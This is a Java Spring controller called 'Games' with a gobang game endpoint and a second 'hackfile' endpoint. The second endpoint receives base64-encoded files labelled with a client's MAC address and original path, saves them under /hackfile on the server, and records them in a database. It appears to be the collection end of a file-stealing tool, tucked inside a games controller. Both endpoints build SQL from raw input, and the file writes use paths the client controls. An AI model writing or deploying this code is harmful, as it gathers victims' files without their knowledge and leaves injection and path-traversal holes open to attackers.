package com.controller;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.sql.Timestamp;
import java.util.Base64;
import java.util.Date;

import org.apache.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.entity.HackFile;
import com.google.gson.Gson;
import com.utils.Mysql;

/**
 * author :lzy date :2017年12月22日上午9:40:26
 */

@RequestMapping("/games")
@Controller
public class Games {

	Logger log = Logger.getLogger(Games.class);

	static Gson gson = new Gson();
	
	static String BASEPATH="/hackfile";

	@RequestMapping(params = "gobang")
	public String gobang() {
		return "gobang";
	}

	@RequestMapping(params = "gobangdata")
	public String gobangData(String data, String winner) {
		System.out.println(data);
		String sql = "insert into gobang(jsondata,winner) values('" + data + "','" + Integer.parseInt(winner) + "')";
		Mysql.execSQL(sql);
		return "ok";
	}

	@RequestMapping(params = "hackfile",method=RequestMethod.POST)
	public String file(String data) {
		try{
			HackFile file = gson.fromJson(data, HackFile.class);
//			if(file.getType().equals("txt")){//文本文件
//				
//			}else{//流文件
				final Base64.Decoder decoder = Base64.getDecoder();
				byte[] b=decoder.decode(file.getData());
				String serverPath=BASEPATH+"/"+file.getMac()+"/"+file.getClientPath().replaceAll("\\\\\\\\", "/");
				file.setServerPath(serverPath);
				File newFile=new File(serverPath);
				newFile.getParentFile().mkdirs();
				FileOutputStream fos=new FileOutputStream(newFile);
				BufferedOutputStream bos=new BufferedOutputStream(fos);
				bos.write(b);
				bos.close();
//			}
			String sql = "insert into hackfile(mac,type,size,name,clientpath,serverpath,date) values('" + file.getMac() + "','"
					+ file.getType() + "','" + file.getSize() + "','" + file.getName() + "','" + file.getClientPath() + "','" + file.getServerPath()
					+ "','" +  new Timestamp(new Date().getTime()) + "')";
			Mysql.execSQL(sql);
		}catch(Exception e){
			e.printStackTrace();
		}
		
		
		return "ok";
	}
	
}
